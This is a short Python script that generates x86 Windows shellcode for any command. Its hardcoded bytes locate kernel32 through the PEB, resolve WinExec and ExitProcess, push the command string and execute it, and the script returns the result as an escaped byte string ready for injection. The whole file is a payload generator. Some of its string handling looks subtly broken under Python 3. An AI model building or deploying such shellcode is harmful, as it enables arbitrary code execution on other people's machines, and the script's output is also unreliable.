# Work already test on w7,w8,w10(x86/x86_x64)
import codecs


def WinExec(command):
    from re import findall
    fill = "31c9b957696e45eb0431c9eb0031c" + "031db31d231ff31f6648b7b308b7f0"
    fill += "c8b7f1c8b47088b77208b3f807e0c3"
    fill += "375f289c703783c8b577801c28b7a2"
    fill += "001c789dd81f957696e45753b8b34a"
    fill += "f01c645390e75f68b7a2401c7668b2"
    fill += "c6f8b7a1c01c78b7caffc01c789d9b1ff53e2fd"
    if len(command) == 4:
        stack = f"{codecs.encode(command, 'hex')}"
        data = findall("..?", stack)
        fill += "68" + "".join(data)
    else:											
        if len(command) % 4 == 3:										
            padd = "\x20"							
        elif len(command) % 4 == 2:				
            padd = "\x20" * 2							
        elif len(command) % 4 == 1:					
            padd = "\x20" * 3							
        else:
            padd = ""
        command = command + padd
        fixmesempai = findall('....?', command)
        for x in fixmesempai[::-1]:
            first = str(codecs.encode(x[::-1].encode('utf-8'), 'hex'))
            second = findall("..?", first)[::-1]
            fill += "68" + "".join(second)
    fill += "89e2415152ffd7e886ffffff8b34af0"
    fill += "1c645813e4578697475f2817e045072"
    fill += "6f6375e98b7a2401c7668b2c6f8b7a1c"
    fill += "01c78b7caffc01c731c951ffd7"
    return "\\x" + "\\x".join(findall("..?", fill))
